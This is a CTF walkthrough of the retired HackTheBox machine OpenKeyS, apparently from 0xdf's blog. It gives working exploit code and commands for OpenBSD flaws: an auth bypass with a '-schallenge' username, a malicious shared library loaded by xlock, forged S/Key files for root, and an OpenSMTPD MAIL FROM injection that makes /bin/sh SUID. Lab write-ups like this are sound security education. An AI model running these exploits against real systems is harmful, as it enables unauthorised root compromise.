---
title: HTB: OpenKeyS
url: https://0xdf.gitlab.io/2020/12/12/htb-openkeys.html
date: 2020-12-12T14:45:00+00:00
difficulty: Medium [30]
tags: ctf, htb-openkeys, hackthebox, nmap, vim, bsd, openbsd, gobuster, php, auth-userokay, cve-2019-19521, cve-2019-19520, cve-2019-19522, shared-object, skey, cve-2020-7247, htb-onetwoseven
---

![OpenKeyS](https://0xdfimages.gitlab.io/img/openkeys-cover.png)

OpenKeyS was all about a series of OpenBSD vulnerabilities published by Qualys in December 2019. I’ll enumerate a web page to find a vim swap file that provides some hints about how the login form is doing auth. I’ll use that to construct an attack that allows me to bypass the authentication and login as Jennifer, retrieving Jennifer’s SSH key. To root, I’ll exploit two more vulnerabilities, first to get access to the auth group using a shared library attack on xlock, and then abusing S/Key authentication. In Beyond Root, I’ll look at another OpenBSD vulnerability that was made public just after the box was released, and play with PHP and the $\_REQUEST variable.

## Box Info

| Name | [OpenKeyS](https://hackthebox.com/machines/openkeys)  [OpenKeyS](https://hackthebox.com/machines/openkeys) [Play on HackTheBox](https://hackthebox.com/machines/openkeys) |
| --- | --- |
| Release Date | [25 Jul 2020](https://twitter.com/hackthebox_eu/status/1286321237019496451) |
| Retire Date | 12 Dec 2020 |
| OS | OpenBSD OpenBSD |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for OpenKeyS |
| Radar Graph | Radar chart for OpenKeyS |
| First Blood User | 01:29:49[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 01:29:37[xct xct](https://app.hackthebox.com/users/13569) |
| Creators | [polarbearer polarbearer](https://app.hackthebox.com/users/159204)  [GibParadox GibParadox](https://app.hackthebox.com/users/125033) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.199
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 12:44 EDT
Warning: 10.10.10.199 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.199
Host is up (0.017s latency).
Not shown: 62350 filtered ports, 3183 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 71.31 seconds

root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.199
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 12:48 EDT
Nmap scan report for 10.10.10.199
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds

```

The HTTP server reports this is OpenBSD (which matches what HTB displays).

### Website - TCP 80

#### Site

Visiting the web root returns a HTTP 200 that redirects to `index.php`:

```

HTTP/1.1 200 OK
Connection: close
Content-Length: 96
Content-Type: text/html
Date: Sun, 26 Jul 2020 16:51:30 GMT
Last-Modified: Tue, 23 Jun 2020 08:18:15 GMT
Server: OpenBSD httpd

<html>
  <head>
    <meta http-equiv="refresh" content="0; url=index.php" />
  </head>
</html>

```

`/index.php` presents a login page:

![image-20200726125111255](https://0xdfimages.gitlab.io/img/image-20200726125111255.png)

The title of the page is also interesting: “OpenKeyS - Retrieve your OpenSSH Keys”. The “Forgot?” link doesn’t go anywhere.

Logging in sends a POST request to `index.php` with data `username=0xdf&password=0xdf`. When the creds are bad, the response provides the same page with a red message at the top of the page:

![image-20200726125521655](https://0xdfimages.gitlab.io/img/image-20200726125521655.png)

Some basic SQL checks with `'` and `"` in either field didn’t result in anything.

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

root@kali# gobuster dir -u http://10.10.10.199 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-root-med-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.199
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/07/26 12:56:49 Starting gobuster
===============================================================
/index.php (Status: 200)
/images (Status: 301)
/css (Status: 301)
/includes (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/fonts (Status: 301)
===============================================================
2020/07/26 13:01:33 Finished
===============================================================

```

#### Directories

I don’t typically show peaking into the directories like the ones above because the are typically not interesting. However, here, directory listing is enabled, which is nice, and it shows an interesting file in `/includes`:

![image-20200726132205821](https://0xdfimages.gitlab.io/img/image-20200726132205821.png)

Clicking on `auth.php` will just show a blank page (because the server is running the PHP), but the `.swp` file is something I recognize as a `vim` swap file, which stores information about files open in the editor. I worked with a similar file in [OneTwoSeven](/2019/08/31/htb-onetwoseven.html#sftp-symlinks). I’ll download the file with `wget`, and then open it with `vim -r auth.php.swp`:

![image-20200726132902558](https://0xdfimages.gitlab.io/img/image-20200726132902558.png)

It fully recovers, and provides the full path to `auth.php` on OpenKeyS, `/var/www/htdocs/includes/auth.php`. On hitting enter, I get the full file:

```

<?php

function authenticate($username, $password)
{
    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
    system($cmd, $retcode);
    return $retcode;
}

function is_active_session()
{
    // Session timeout in seconds
    $session_timeout = 300;

    // Start the session
    session_start();

    // Is the user logged in? 
    if(isset($_SESSION["logged_in"]))
    {
        // Has the session expired?
        $time = $_SERVER['REQUEST_TIME'];
        if (isset($_SESSION['last_activity']) &&
            ($time - $_SESSION['last_activity']) > $session_timeout)
        {
            close_session();
            return False;
        }
        else
        {
            // Session is active, update last activity time and return True
            $_SESSION['last_activity'] = $time;
            return True;
        }
    }
    else
    {
        return False;
    }
}

function init_session()
{
    $_SESSION["logged_in"] = True;
    $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
    $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION["username"] = $_REQUEST['username'];
}

function close_session()
{
    session_unset();
    session_destroy();
    session_start();
}

?>

```

There’s one other thing I can get our of this swap file. If I look at it on it’s own (not by recovering it), I can see a username, jennifer:

![image-20200727122200762](https://0xdfimages.gitlab.io/img/image-20200727122200762.png)

## Shell as jennifer

### Site Login

#### Not Command Injection

I immediately looked at the `authenticate()` function in the PHP and thought about command injection:

```

function authenticate($username, $password)
{
    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
    system($cmd, $retcode);
    return $retcode;
}

```

The problem is `escapeshellcmd`, which:

> **escapeshellarg()** adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include [exec()](https://www.php.net/manual/en/function.exec.php), [system()](https://www.php.net/manual/en/function.system.php) and the [backtick operator](https://www.php.net/manual/en/language.operators.execution.php).

[This page](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#known-bypassesexploits) does an awesome job of explaining how `escapeshellargs` and `escapeshellcmd` work, and what security they provide and what they don’t. Unfortunately for me here, they prevent command injection.

#### check\_auth

I visited `http://10.10.10.199/auth_helpers/check_auth`, and it downloaded a file which is an OpenBSD 64-bit ELF file:

```

root@kali# file check_auth 
check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped

```

I opened it in Ghidra, but it didn’t buy me much. However, running `strings` on the binary was very useful. One string towards the top (and then again at the bottom) was `auth_userokay`:

```

root@kali# strings check_auth 
/usr/libexec/ld.so
OpenBSD  
libc.so.95.1       
_csu_finish
exit                 
_Jv_RegisterClasses
atexit
auth_userokay
_end               
AWAVAUATSH
...[snip]...

```

Googling that string leads to the [OpenBSD man page](https://man.openbsd.org/authenticate.3) for `authenticate`, which defines `auth_userokay` as a function that will take a username and some auth details and return 0 for failure and non-zero for success. This binary looks like some kind of wrapper that’s calling into the BSD authentication system.

#### CVE-2019-19521

CVE-2019-19521 is an authentication-bypass vulnerability in OpenBSD’s authentication system that [Qualys found and disclosed](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt). It found that if the username took the form of `-option`, that the authentication programs would behave in strange ways. One specific strange way was that if the username was `-schallenge`, it would return successful.

That happens to work here. I’ll enter `-schallenge` as the username and `0xdf` as the password, and login:

![image-20200727125645763](https://0xdfimages.gitlab.io/img/image-20200727125645763.png)

I’ve got login bypass.

### Login as Jennifer

#### PHP Analysis

The problem with the auth bypass above is that the username has to be a fixed string, and being in as that user doesn’t seem too useful. It turns out there’s a small bug in how the the sessions are handled that allows me to log in as one user and set my username to any other user.

There are four functions defined in `auth_helpers.php`: `authenticate`, `is_active_session`, `init_session`, and `close_session`. I know that logging in submits a POST to `index.php`, which likely includes `auth.php`. Just looking at the functions from `auth.php`, I can guess roughly what the structure that handles the POST request in `index.php` looks like (in pseudo-code, not PHP) using all four functions:

```

if request is a POST:
    if is_active_session():
        close_session()
    if authenticate($POST['username'], $_POST['password']):
    	init_session()
        return redirect to some other page
    else:
        echo "Authentication denied."

```

I’ve already figured out how to get `authenticate` to return true. I’ll take another look at `init_session()`:

```

function init_session()
{
    $_SESSION["logged_in"] = True;
    $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
    $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION["username"] = $_REQUEST['username'];
}

```

`$_SESSION` is a variable that PHP keeps for you that is associated with a given session cookie. I want to get it set to a different username than the one I POST.

#### $\_REQUEST

I learned something new about PHP doing this box. I’ve used `$_REQUEST` before with a webshell so that it will work with either a GET or a POST request. The PHP docs for `$_REQUEST` show that it is actually:

> An associative [array](https://www.php.net/manual/en/language.types.array.php) that by default contains the contents of [$\_GET](https://www.php.net/manual/en/reserved.variables.get.php), [$\_POST](https://www.php.net/manual/en/reserved.variables.post.php) and [$\_COOKIE](https://www.php.net/manual/en/reserved.variables.cookies.php).

I had no idea that cookies were also checked in `$_REQUEST` (by default, checking `$_COOKIE` is actually disabled). I’ll play with this in [Beyond Root](#php-_request).

If the session is set using `$_REQUEST`, but the name passed to `authenticate` is from `$_POST`, then I can exploit this mismatch. I can’t see what is passed to `authenticate` without access to `index.php`, but it’s worth a try.

I tried intercepting a login POST with Burp and adding a cookie so that the request looked like:

![image-20200727191918452](https://0xdfimages.gitlab.io/img/image-20200727191918452.png)

When I forward the request, OpenKeyS returns a 302 with a location of `sshkey.php`. Back in my browser, I’ve got a new page with jennifer’s SSH Key.

[![image-20200727192041763](https://0xdfimages.gitlab.io/img/image-20200727192041763.png)](https://0xdfimages.gitlab.io/img/image-20200727192041763.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200727192041763.png)

### SSH

I can use the key to get a shell as jennifer with SSH:

```

root@kali# ssh -i ~/keys/id_rsa_openkeys_jennifer jennifer@10.10.10.199
Last login: Mon Jul 27 21:23:08 2020 from 10.10.14.139
OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019
                                                                                                        
Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

openkeys$

```

And grab `user.txt`:

```

openkeys$ cat user.txt
36ab2123************************

```

## Priv: jennifer –> root

### Enumeration

There are three more CVEs in the [same post from Qualys](https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt) beyond the authentication bypass:
- Local privilege escalation via xlock [CVE-2019-19520]
- Local privilege escalation via S/Key and YubiKey [CVE-2019-19522]
- Local privilege escalation via su [CVE-2019-19519]

Reading each of these, the last doesn’t seem useful. The S/Key one jumps out because of the box name, but it only jumps from the `auth` group to root, and jennifer is not in auth:

```

openkeys$ id
uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)

```

But, the `xlock` vulnerability will allow me to gain the privileges of the `auth` group, so I can use these two together to get a shell as root.

### Shortcut Script

To just get root, there’s a beautiful script [on GitHub](https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot) that will return a root shell. I’ll open `vi` and paste in the code, and then set it executable:

```

openkeys$ vi .df 
openkeys$ chmod +x .df

```

Now just run it:

```

openkeys$ ./.df
./.df[1]: penbsd-authroot: not found
openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
[*] checking system ...
[*] system supports S/Key authentication
[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
[*] compiling ...
[*] running Xvfb ...
[*] testing for CVE-2019-19520 ...
[+] success! we have auth group permissions

WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

[*] trying CVE-2019-19522 (S/Key) ...
Your password is: EGG LARD GROW HOG DRAG LAIN
otp-md5 99 obsd91335
S/Key Password:
openkeys#

```

And grab `root.txt`:

```

openkeys# cat root.txt
f3a553b1************************

```

### Manual CVE-2019-19520

#### Overview

`xlock` is program that locks the screen and waits for the user to re-enter their password. There is a check (in `xenocara/lib/mesa/src/loader/loader.c`) to make sure that SUID binaries can’t use the `LIBGL_DRIVERS_PATH` environment variable. This makes sense, because otherwise anyone could set the path to a directory they control, create a malicious library/driver that is loaded by a SUID binary, and then they get a shell as the owner of that binary.

The vulnerability is that the check in OpenBSD checks for SUID, but forgets about SetGUID binaries:

```

113    if (geteuid() == getuid()) {
114       /* don't allow setuid apps to use LIBGL_DRIVERS_PATH */
115       libPaths = getenv("LIBGL_DRIVERS_PATH");

```

`xlock` runs as the `auth` group:

```

openkeys$ ls -l /usr/X11R6/bin/xlock
-rwxr-sr-x  1 root  auth  3138520 Oct 12  2019 /usr/X11R6/bin/xlock

```

It also tries to load a driver named `swrast_dri.so`. So the attack is basically to drop a malicious library file with a `static void __attribute__ ((constructor)) _init (void)` function that will just exec a shell.

#### Shell

The proof of concept in the Qualys paper uses the following:

```

#include <paths.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}

```

This looks confusing at first, but really, it checks that can read the set-group-id of the current process, then sets the real, effective, and set-group-id groups to that group (in this case `auth`). Then it sets `argv` to `[/bin/ksh, 0]`, as `_PATH_KSHELL` is defined in `paths.h`, which I can find that on OpenKeyS:

```

openkeys$ find /usr/ -name paths.h 2>/dev/null
/usr/src/include/paths.h
/usr/include/paths.h
openkeys$ grep KSHELL /usr/include/paths.h     
#define _PATH_KSHELL    "/bin/ksh"

```

Then it calls `execve` with that set of args, which replaces the current process with the new shell.

#### Execute

I’ll run with the POC from Qualys, working out of any directory (Qualys shows `/tmp`, but I’ll use `/var/tmp` for variety). First I’ll drop the code for the shell and compile it:

```

openkeys$ cat > swrast_dri.c << "EOF"
> #include <paths.h>   
> #include <sys/types.h>       
> #include <unistd.h>                                                                                                                                                                                            
>          
> static void __attribute__ ((constructor)) _init (void) {
>     gid_t rgid, egid, sgid;                   
>     if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
>     if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);
>                                
>     char * const argv[] = { _PATH_KSHELL, NULL };
>     execve(argv[0], argv, NULL);
>     _exit(__LINE__);                    
> }                                              
> EOF                             
openkeys$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c

```

Next I run `Xvfb`, which is the virtual framebuffer. It’s not totally clear to my why I do this, but I’m setting up the server to listen for connections on a server (poc uses `:66`, but it’s arbitrary, I’ll use `:45`). I think this is to allow me to get a response from `xlock` even though it’s not a program that displays anything. When I run it, sometimes it throws an error (on a clean reset it does not), but it’s still running in the background (because of the `&` at the end of the line):

```

openkeys$ env -i /usr/X11R6/bin/Xvfb :45 -cc 0 &
[1] 44906
openkeys$ _XSERVTransmkdir: ERROR: euid != 0,directory /tmp/.X11-unix will not be created.

```

Now I’ll run `xlock`, with the `LIBGL_DRIVERS_PATH` set to the current directory, and tell it to display on `:45`. The resulting shell has the `auth` group:

```

openkeys$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :45
openkeys$ id
uid=1001(jennifer) gid=11(auth) groups=1001(jennifer), 0(wheel)

```

### Manual CVE-2019-19522

#### S/Key Background

[S/Key](https://en.wikipedia.org/wiki/S/KEY) is a one-time password (OTP) system. It works by starting with some seed, hashing it, and saving that as the last item in a list. It then hashes that result again, and saves it as the second to last item. It continues n times, generating a list of n hashes. The server keeps only the first hash on the list, and give the rest (2 to n) to the user. When the user logs in, they provide the top hash on the list, which the server hashes. If it matches what was in the config, it grants access and updates the config with the provided hash. The user can cross the top hash off their list, next time providing the next hash.

The config file for each use lives in `/etc/skey`. The [man page](https://man.openbsd.org/skey.5) for S/Key shows an example file:

```

root
md5
99
obsd36521
1f4359a3764b675d

```

This file shows the user, the hash algorithm, the sequence number, the seed to be used with the hash, and the next result.

The other thing to know about S/Key - so the user doesn’t have to type in a long, hex string, the hash is broken up into six short words, one to four characters each. For example `3F3B F4B4 145F D74B` is represented as `TAG SLOW NOV MIN WOOL KENO`.

#### Exploit Background

The issue here is that the `/etc/skey` directory is writable by the `auth` group:

```

openkeys$ ls -ld /etc/skey
drwx-wx--T  2 root  auth  512 Jun 24 09:25 /etc/skey

```

This means that as `auth`, I can write a config file into the directory for any user, including root, and then authenticate against S/Key to get a shell.

#### Execute

With a shell in the `auth` group, I’ll write the file and change the permissions to 600:

```

openkeys$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root
openkeys$ chmod 0600 /etc/skey/root

```

I actually can’t look at the result, but it is in there. Now I can run `su` to get a shell as root. I’ll use `-l` to actually login, `-a skey` to specify S/Key auth. The POC also uses `env -i TERM=vt220` to clear the environment and then set the terminal on running. I can run without that, but then I’m prompted for the terminal type. When prompted for the password, I’ll enter “EGG LARD GROW HOG DRAG LAIN”, because I know from the script that is what is expected for the seed 8b6d96e0ef1b1c21. Then it returns a root shell.

```

openkeys$ env -i TERM=vt220 su -l -a skey
otp-md5 99 obsd91335
S/Key Password:                                                                                         
openkeys#

```

## Beyond Root

### Unintended Root - CVE-2020-7247

A few days after this box was submitted, a new CVE for OpenBSD was released, [CVE-2020-7247](https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt), allowing for command injection into the SMTP daemon. OpenKeyS is vulnerable to it. I’ll connect to port 25 on localhost. The connection will hang for several minutes while it tries to resolve a DNS query to 8.8.8.8. Eventually, it will return with it’s 220 statement. I’ll identify as jennifer, and then send a malicious `MAIL FROM:` with a command injection. I’ll find a valid recipient (jennifer again), and then send an empty email:

```

openkeys$ nc 127.0.0.1 25 
220 openkeys.htb ESMTP OpenSMTPD
HELO jennifer
250 openkeys.htb Hello jennifer [127.0.0.1], pleased to meet you
MAIL FROM:<;chmod u+s /bin/sh;>
250 2.0.0 Ok
RCPT TO:<jennifer>
250 2.1.5 Destination address valid: Recipient ok
DATA
354 Enter mail, end with "." on a line by itself
.
250 2.0.0 fffb5159 Message accepted for delivery

```

I’m very limited in what kind of command injections I can do, the maximum length for the address is 64 characters, and any characters in `!#$%&'*?``{|}~` are escaped to a `:`. The simple payload above works nicely. After running it, I’ll Ctrl-c to kill the connection to SMTP, and now `/bin/sh` is SUID:

```

openkeys$ ls -l /bin/sh
-r-sr-xr-x  3 root  bin  625032 Oct 12  2019 /bin/sh

```

Running it returns a root shell:

```

openkeys$ /bin/sh
openkeys# 

```

### PHP $\_REQUEST

#### Local Script

Having spent my entire hacking life thinking that `$_REQUEST` checked only GET and POST parameters, I wanted to play more with this. I wrote a dumb little PHP program that will inspect and print `$_GET`, `$_POST`, `$_COOKIE`, and `$_REQUEST`:

```

<?php
echo "GET[test]: " . $_GET['test'] . "\n";
echo "POST[test]: " . $_POST['test'] . "\n";
echo "COOKIE[test]: " . $_COOKIE['test'] . "\n";
echo "REQUEST[test]: " . $_REQUEST['test'] . "\n";
?>

```

I then served it locally using the PHP built-in server:

```

root@kali# php -S 127.0.0.1:8888
PHP 7.3.15-3 Development Server started at Mon Jul 27 21:14:38 2020
Listening on http://127.0.0.1:8888
Document root is /media/sf_CTFs/hackthebox/openkeys-10.10.10.199
Press Ctrl-C to quit.

```

To make sure everything worked, from another terminal I tried sending just a GET parameter and just a POST parameter:

```

root@kali# curl 127.0.0.1:8888/test.php?test=get
GET[test]: get
POST[test]: 
COOKIE[test]: 
REQUEST[test]: get
root@kali# curl 127.0.0.1:8888/test.php -d 'test=post'
GET[test]: 
POST[test]: post
COOKIE[test]: 
REQUEST[test]: post

```

When the same parameter exists in both GET and POST, `$_REQUEST` favors POST:

```

root@kali# curl 127.0.0.1:8888/test.php?test=get -d 'test=post'
GET[test]: get
POST[test]: post
COOKIE[test]: 
REQUEST[test]: post

```

What about the case I had on OpenKeyS where I sent both a POST and a cookie? It didn’t seem to go to `$_REQUEST`:

```

root@kali# curl 127.0.0.1:8888/test.php -H 'Cookie: test=cookie' -d "test=post"
GET[test]: 
POST[test]: post
COOKIE[test]: cookie
REQUEST[test]: post

```

I took the POST data out, and it still didn’t work like it did on OpenKeyS:

```

root@kali# curl 127.0.0.1:8888/test.php -H 'Cookie: test=cookie'
GET[test]: 
POST[test]: 
COOKIE[test]: cookie
REQUEST[test]: 

```

#### Back to the Docs

Back in the [PHP docs](https://www.php.net/manual/en/reserved.variables.request.php) for `$_REQUEST`, there’s this:

![image-20200727211834441](https://0xdfimages.gitlab.io/img/image-20200727211834441.png)

That link leads to the [docs](https://www.php.net/manual/en/ini.core.php#ini.request-order) for `php.ini`, to the section on `request_order`:

> This directive describes the order in which PHP registers GET, POST and Cookie variables into the \_REQUEST array. Registration is done from left to right, newer values override older values.
>
> If this directive is not set, [variables\_order](https://www.php.net/manual/en/ini.core.php#ini.variables-order) is used for [$\_REQUEST](https://www.php.net/manual/en/reserved.variables.request.php) contents.
>
> Note that the default distribution php.ini files does not contain the *‘C’* for cookies, due to security concerns.

That description has two important points: if it’s not set, the default is to follow `variables_order`, and that by default, cookies are not included (which explains why it’s not doing anything in the test above).

#### php.ini

I grabbed the `php.ini` file from OpenKeyS. The section on `request_order` is commented out (and the spacing is slightly off, suggesting it might have been an edit by the box author):

```

; This directive determines which super global data (G,P & C) should be
; registered into the super global array REQUEST. If so, it also determines
; the order in which that data is registered. The values for this directive
; are specified in the same manner as the variables_order directive,
; EXCEPT one. Leaving this value empty will cause PHP to use the value set
; in the variables_order directive. It does not mean it will leave the super
; globals array REQUEST empty.
; Default Value: None
; Development Value: "GP"
; Production Value: "GP"
; http://php.net/request-order
;request_order = "GP"

```

Based on the docs above, I checked the `variables_order` (just above `request_order` in the `.ini` file):

```

; This directive determines which super global arrays are registered when PHP
; starts up. G,P,C,E & S are abbreviations for the following respective super
; globals: GET, POST, COOKIE, ENV and SERVER. There is a performance penalty
; paid for the registration of these arrays and because ENV is not as commonly
; used as the others, ENV is not recommended on productions servers. You
; can still get access to the environment variables through getenv() should you
; need to.
; Default Value: "EGPCS"
; Development Value: "GPCS"
; Production Value: "GPCS";
; http://php.net/variables-order
variables_order = "GPCS"

```

This is set to run GET, POST, cookies, and then server. For `request_order`, server isn’t an option, so it will run `GPC`.

#### Local Script Again

I started the PHP server again, this time with the `.ini` file by running `php -S 127.0.0.1:8888 -c php-7.3.ini`. It threw some warnings about missing modules that weren’t installed on my host, but it did start.

Now things behave like I experienced on the box:

```

root@kali# curl 127.0.0.1:8888/test.php -H 'Cookie: test=cookie' -d "test=post"
GET[test]: 
POST[test]: post
COOKIE[test]: cookie
REQUEST[test]: cookie

```